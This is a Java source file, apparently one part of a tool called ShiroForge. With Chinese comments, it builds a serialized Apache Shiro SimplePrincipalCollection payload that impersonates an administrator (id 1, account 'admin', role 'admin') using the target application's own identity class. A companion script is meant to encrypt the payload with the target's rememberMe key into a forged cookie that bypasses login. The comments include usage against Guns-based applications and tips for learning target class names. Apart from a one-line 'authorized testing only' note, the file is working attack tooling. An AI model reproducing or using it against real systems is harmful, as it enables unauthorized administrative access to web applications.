import org.apache.shiro.subject.SimplePrincipalCollection;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Arrays;

/**
 * ShiroForge · 身份类载荷生成器
 *
 * 用途：用「目标应用自己的身份类」构造 SimplePrincipalCollection（SPC）载荷，
 *       再交由 shiroforge.py 用目标的 rememberMe 密钥加密，得到一枚可绕过登录的伪造 cookie。
 *
 * 用法：
 *   java -cp "build/classes;lib/shiro-core-1.7.1.jar" GenShiroSPC <FQCN> <id> <account> <out.bin>
 *   例：java -cp "build/classes:lib/shiro-core-1.7.1.jar" GenShiroSPC \
 *            com.jsnjfz.manage.core.shiro.ShiroUser 1 admin payload.bin
 *
 * 前置条件（关键）：
 *   1) 生成端的 classpath 上必须存在 <FQCN> 对应的「同名存根类」（见 java/stubs/ 示例）；
 *   2) 该存根的 serialVersionUID、字段名与类型必须与目标一致，否则目标侧会
 *      ClassNotFoundException / InvalidClassException，表现为响应出现 rememberMe=deleteMe；
 *   3) 身份类的包名/类名可通过目标的报错泄露、源码仓库或反编译对应 jar 得到。
 *
 * 输出：Java 序列化字节流（文件开头固定为 AC ED 00 05）。
 *
 * 仅限授权测试使用。
 */
public class GenShiroSPC {

    public static void main(String[] a) throws Exception {
        if (a.length < 4) {
            System.out.println("用法: java -cp \"build/classes;lib/shiro-core-1.7.1.jar\" "
                    + "GenShiroSPC <FQCN> <id> <account> <out.bin>");
            System.out.println("例  : ... GenShiroSPC com.jsnjfz.manage.core.shiro.ShiroUser 1 admin payload.bin");
            System.exit(2);
        }

        String fqcn = a[0];
        int id = Integer.parseInt(a[1]);
        String account = a[2];
        String out = a[a.length - 1];

        Class<?> c = Class.forName(fqcn);
        Object u = c.getDeclaredConstructor().newInstance();
        // 下列字段名按 Guns / Webstack-Guns 系（常见）填写。
        // 其他系统请按目标身份类的真实字段名修改（字段不存在会被跳过并提示）。
        set(u, "id", Integer.valueOf(id));
        set(u, "account", account);
        set(u, "name", account);
        set(u, "deptId", Integer.valueOf(1));
        set(u, "roleList", new ArrayList<Integer>(Arrays.asList(1)));
        set(u, "deptName", "hq");
        set(u, "roleNames", new ArrayList<String>(Arrays.asList("admin")));

        SimplePrincipalCollection spc = new SimplePrincipalCollection();
        spc.add(u, "ShiroDbRealm");
        spc.add(u, c.getName() + "Realm");

        ByteArrayOutputStream bo = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bo);
        oos.writeObject(spc);
        oos.close();
        Files.write(Paths.get(out), bo.toByteArray());
        System.out.println("fqcn=" + fqcn + " id=" + id + " account=" + account
                + " bytes=" + bo.size() + " -> " + out);
    }

    /** 按字段名反射赋值；字段不存在时跳过并提示（不同系统的身份类字段不同） */
    static void set(Object o, String name, Object v) {
        try {
            Field f = o.getClass().getField(name);
            f.set(o, v);
        } catch (Throwable t) {
            System.out.println("  (skip field " + name + ": " + t.getClass().getSimpleName() + ")");
        }
    }
}